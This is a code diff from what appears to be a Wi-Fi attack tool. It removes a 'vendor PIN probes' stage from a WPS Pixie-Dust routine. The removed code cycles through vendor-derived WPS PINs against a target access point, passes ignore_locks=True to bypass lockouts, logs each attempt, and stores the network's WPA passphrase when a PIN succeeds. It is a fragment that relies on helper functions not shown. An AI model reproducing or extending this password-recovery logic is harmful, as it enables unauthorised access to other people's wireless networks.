@@ -520,62 +520,6 @@ def pixie(mon, target, req, emit, stop_flag, run_id=None, iface_name=None):
             if psk:
                 psk_from = "oneshot_pixie"
 
-    # --- 3) vendor/static PIN probes ---
-    if (not pin and not psk and not cancelled and not soft
-            and not (stop_flag and stop_flag.is_set())):
-        methods_tried.append("vendor_pin")
-        cands = oneshot_wps.vendor_candidates(bssid)
-        if not cands:
-            wps_log.method({
-                "run_id": run_id, "bssid": bssid, "essid": essid,
-                "method": "vendor_pin", "result": "skip", "reason": "no cands",
-                "won": 0,
-            })
-        locked = False
-        for i, cand in enumerate(cands, 1):
-            if stop_flag and stop_flag.is_set():
-                cancelled = True
-                break
-            if locked:
-                break
-            algo, try_pin = cand["algo"], cand["pin"]
-            if try_pin == "":
-                # empty PIN needs special registrar handling; skip in reaver -p
-                wps_log.method({
-                    "run_id": run_id, "bssid": bssid, "essid": essid,
-                    "method": "vendor_pin", "attempt": i,
-                    "pin_algo": algo, "pin": "empty",
-                    "result": "skip", "reason": "empty", "won": 0,
-                })
-                continue
-            emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
-                             phase="VPIN", countdown=oneshot_wps.VENDOR_TRY_SEC,
-                             cd_max=oneshot_wps.VENDOR_TRY_SEC, signal=signal))
-            t0 = time.time()
-            got = _recover_psk(
-                mon, target, try_pin, emit, essid, bssid, stop_flag,
-                tool=tool, ignore_locks=True,
-                timeout=oneshot_wps.VENDOR_TRY_SEC)
-            # _recover_psk doesn't return lock — detect via log is hard;
-            # treat None as fail. Short tries only.
-            t = time.time() - t0
-            ok = got is not None
-            wps_log.method({
-                "run_id": run_id, "bssid": bssid, "essid": essid,
-                "ch": channel, "sig": signal, "method": "vendor_pin",
-                "attempt": i, "pin_algo": algo, "pin": try_pin or "empty",
-                "result": "psk" if ok else "fail",
-                "reason": "ok" if ok else "no psk", "t": t,
-                "won": 1 if ok else 0,
-            })
-            if ok:
-                winner = "vendor_pin"
-                pin = try_pin
-                psk = got
-                pin_from = "vendor_pin"
-                psk_from = "vendor_pin"
-                break
-
     # --- GETPSK if we have PIN but no PSK ---
     if (pin is not None and psk is None and not cancelled
             and not (stop_flag and stop_flag.is_set())):
